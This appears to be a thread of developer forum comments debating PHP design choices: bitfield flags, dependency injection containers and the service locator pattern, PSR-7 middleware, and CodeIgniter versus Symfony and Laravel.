&gt; RDBMS vendors don't all support the same numeric precisions, and most(all?) support precisions higher than PHP does I don't understand this part. &gt; There are also the pretty major problems of how to handle more flags than is supported by the data type you chose for your original bitfield column If you need THAT many flags, you should prolly reconsider your design a bit &amp; use a new object &gt; how to remove settings yes, this would require direct db queries to clean up if you wanted to remove, using bitwise where clauses. I would prolly not use this, therefore, for very large tables &gt; but it also suffers from the fact that you're restricted to only 2 values yes, but it isn't really intended to solve that issue. Thanks for the input! 
&gt; service locator pattern Nope, its not. Service locator is when you do do smth like Locator::getMailer()-&gt;send() or $container-&gt;get('mailer')-&gt;send() in your services - in this case in Newsletter. This is standard DIC configured in PHP instead of YAML or XML. Offcourse you can still use it like locator, like many people do (espacially in controllers, its even in examples on Sf page) 
TL/DR: article confuses Symfony DI with containers and service locator with dependency injection. All service containers are not like Symfony DI. Most containers allow to use PHP code to configure service entries (Pimple, Aura, etc.). Here is the article's example using PHP-DI: return [ Transport::class =&gt; function () { $transportHost = 'example.com'; $transportUser = 'root'; $transportPassword = 'somepassword'; return new Transport($transportHost, $transportUser, $transportPassword); }, Mailer::class =&gt; function (ContainerInterface $c) { return new Mailer($c-&gt;get(Transport::class)); }, Newsletter::class =&gt; function (ContainerInterface $c) { return new Newsletter($c-&gt;get(Mailer::class)); }, ]; It works just as well with refactorings and IDE support, and there's no need to learn a custom language. Apart from configuration the rest of the article is confusing dependency injection and the service locator antipattern. You don't want to do `$container-&gt;get()` except in factories (see above) and in your front controller. If you use dependency injection, like this: class UserService { public function __construct(Newsletter $newsletter) {} } then you never face the issues that the author mentioned. However I do agree that [PHP is the best choice for configuring PHP apps](http://php-di.org/news/06-php-di-4-0-new-definitions.html).
&gt; You don't want to do $container-&gt;get() except in factories (see above) and in your front controller Many people do `$container-&gt;get` in their controllers. While it's considered an anti pattern now, injecting every dependency into your controller leads to a controller with 20 arguments when your application is complex. This is not very nice, also looking from a performance standpoint. While it's not nice when your controller has 20 dependencies, you cannot just rewrite the whole application. Also regarding factories: I have multiple container aware factories. And I want automatic refactor tooling for them. PHP DI has support for type inference in PhpStorm only when the first argument to `Container::get` is a class name. So when you have only a single mailer service, the expression `$container-&gt;get(Mailer::class)` can be statically analysed by PhpStorm. When you have a second mailer service, you cannot just name the service after the class name, thus `$container-&gt;get('mail2')` will not have autocompletion etc. For me this was a deal breaker, otherwise I would have used PHP-DI. &gt; then you never face the issues that the author mentioned. That's true. As long as your application is not container aware, you will never have these issues.
The final code example in the article is: $newsletter = $serviceContainer-&gt;newsletter(); This is exactly the service locator pattern.
Anthony's most significant point here is that PSR-7 renders middleware you didn't write yourself, untrustworthy, since one could clobber another, or your own. This basically defeats the purpose of interoperable 3rd party middleware, and the PSR-7 standard itself. It is a self-defeating standard. The PSR ends up defining only the TECHNICAL interoperability of middleware, not its behavioral interoperability. This is like saying you've followed the LSP simply because your return types match, but one implementation throws an exception and returns an array of a different structure than its parent or another sibling. By definition, one middleware that clobbers another is not interoperable, even if it doesn't throw a warning. This is deeply problematic.
&gt;Many people do `$container-&gt;get` in their controllers. While it's considered an anti pattern now, injecting every dependency into your controller leads to a controller with 20 arguments when your application is complex. This is not very nice, also looking from a performance standpoint. While it's not nice when your controller has 20 dependencies, you cannot just rewrite the whole application. I know you're just exaggerating, but still if your class starts need 20 other class dependencies it's probably a sign of being a "god" object. You have to figure out how to break it down into separate classes where not as many constructor parameters are needed. 
I think the two frameworks have completely different uses so comparing them is pretty silly. That said, I feel CodeIgniter is probably a bad fit for any project nowadays. Having used it extensively in the past I can say it's pretty much obsolete and lacks a lot of functionality most of the new(-er) framework have by default. (DI Container, reversed routing, PSR auto loading etc etc) If you feel that the size of the core components has any meaning, you could use some of the "micro" frameworks (silex/slim for example). Personally, I think it's a silly metric and like to judge frameworks more on their functionality and how unobtrusive they are. In that regard, CodeIgniter fails miserable: it forces you to do pretty much everything 'the codeigniter way', having bound everything to one godawful God object, which makes it pretty much impossible to unit test properly, or write anything decoupled from the framework itself. Besides that, it hasn't caught on with the whole composer thing, PSR's and proper autoloading. It's a shame really, and I had some hopes for 3.x, but it seems the devs like to stay in the dark ages. I would strongly suggest you look at some of the other options out there and forget about CodeIgniter. All it can do, other frameworks can do better. If you want something similar but better, you might want to give Laravel a go.
I have to disagree on this. While Symfony can be optimized to be less of a resource hog and work 'quite well', it still requires to load a bunch of files in memory for every request. This is what makes Symfony much slower than other frameworks (Laravel falls into this category as well, it's quite slow compared to other frameworks, though quite fast to prototype or create small-to-medium projects) Sometimes space DOES 'correlate to performance', but it all depends on the situation and your needs, but I don't believe you'll ever use symfony and all its modules to their full potential and thus consuming more resources without any good reason. Of course, this doesn't mean a framework is going to be worse just by the size footprint or the amount of files it has, but it can give you an idea of how it's going to perform in _certain areas_.
&gt; a dissenting external opinion So that I can answer properly: what do you mean when you say "external" opinion? &gt; Someone gets really invested in their baby In fairness, that sentiment may well apply to every side in a debate. (/me shrugs)
Reminder: values are not injectables, when they come from context-specific data.
If you just want to write an application for the client and forget about it once payment is done, then I suggest going with vanilla PHP, it has size of 0MiB, 100% less than CodeIgniter - not even a chance in such comparison. But don't be fooled, CodeIgniter is still a good choice if you know it and do not feel like learning new framework. Now if you want to write an application in modern PHP, using Composer/Packagist to manage dependencies, if you care about security, then we can talk about choosing a framework. And yes, Symfony will be a good choice - just think for yourself and don't download Symfony Standard Edition on first sight. It truly shines when you wire all those components yourself using only things you need - for starters you can have just HttpFoundation, Router, and DependencyInjection which require ~20 lines of code to be up and running. Both CodeIgniter and Symfony do the same thing. But *how* they do it is the real question - there is a thirty-mile-wide quality gap between them.
&gt; What Anthony and others do not consider is that there would almost certainly be an ExceptionHandler middleware that wraps later middleware. That's pretty simplistic. I mean I agree that there would likely be such a middleware as a last-ditch effort to handle uncaught exceptions and produce a reasonable result. But plenty of results would probably not fall into that category including the most basic 404. 
@Shadowhand what do you mean by "custom extensions of a concrete class everywhere". This description doesn't ring a bell in me for anything HttpFoundation users do. The important fact is that we decided back during alpha/beta when designing Symfony, that the response must be in control of the frameworks user, passing it as a service around and an argument to the controller produced tons of problems. This proposal takes this power away for the user to return any kind of response how she wants. To be honest, I personally wouldn't care to exchange new Response() with a factory creating it, the concreteness of the Response object is not the problem here, the moment when and by whom it gets created is. Anthonys proposal showed a (imho) better way to create the response through an interface for the next item in the chain. Its a totally reasonable proposal that you completely ignore in your post. 
If anything/anyone is able to steer the community in a different or better direction, that's a standard. The community is never ready when the first arrives. How long do you reckon we should wait? Cloning is cheap. Objects are cheap. And it's not about one or more fields, it's about immutability. Who says you need 2+ fields to start cloning? Btw, I'm not saying the whole immutable rep/req design is good or bad.